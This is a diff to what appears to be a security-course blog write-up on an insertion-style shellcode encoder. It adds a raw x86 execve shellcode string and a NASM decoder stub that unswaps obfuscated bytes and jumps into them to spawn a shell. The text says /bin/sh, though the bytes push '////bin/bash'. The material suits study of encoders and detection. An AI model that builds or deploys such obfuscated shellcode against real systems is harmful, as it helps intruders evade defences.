@@ -35,7 +35,11 @@ A true Insertion Encoder would insert junk data with more complex algorithms to 
 #### Insertion Encoder in Python
 --------
 
-The execve-stack shellcode from the course material will be used as a reference for the shellcode, the shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell. 
+The execve-stack shellcode from the course material will be used as a reference for the shellcode, the shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell:
+
+```bash
+"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+```
 
 The following Python code will be used as a shellcode wrapper to generate the obfuscated shellcode from the original shellcode: 
 
@@ -91,6 +95,69 @@ Obfuscated shellcode:
 0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd
 osboxes@osboxes:~/Downloads/SLAE$ 
 ```
+
+#### Assembly Code
+-------------
+
+The Assembly code will consist of the the following components:
+
+* Encoded shellcode
+* Decoder stub (Loop through the sequence of bytes 15 times - as the encoded shellcode is 30 bytes in length)
+* Decoded shellcode
+* Execution of decoded shellcode
+
+````nasm
+; Filename: enocder.nasm
+; Author: h3ll0clar1c3
+; Purpose: Decode the encoded shellcode and execute
+; Compilation: ./compile.sh encoder
+; Usage: ./encoder
+; Shellcode size: 60 bytes
+; Architecture: x86
+
+global   _start
+
+section .text
+        _start:
+
+        ; jump to encoded shellcode
+        jmp short call_shellcode
+
+        decoder:
+        pop esi                         ; put address to EncodedShellcode into ESI (jmp-call-pop)
+        xor eax, eax                    ; clear eax register (data)
+        xor ecx, ecx                    ; clear ecx register (loop counter)
+        mov cl, 15                      ; loop 15 times (shellcode is 30 bytes in length)
+
+        decode:
+        ; switch data between esi and esi+1
+        mov  al, byte [esi]
+        xchg byte [esi+1], al
+        mov [esi], al
+
+        ; loop through each of the 2 bytes within the 4 byte segment and decode
+        add esi, 2
+        loop decode
+
+        ; jump to decoded shellcode
+        jmp short EncodedShellcode
+
+        call_shellcode:
+        call decoder
+        EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f        	                     ,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd                                                             
+````
+bash ... compile.sh 
+
+
+
+
+
+
+
+
+
+
+
 
 #### POC (C Code)
 ------
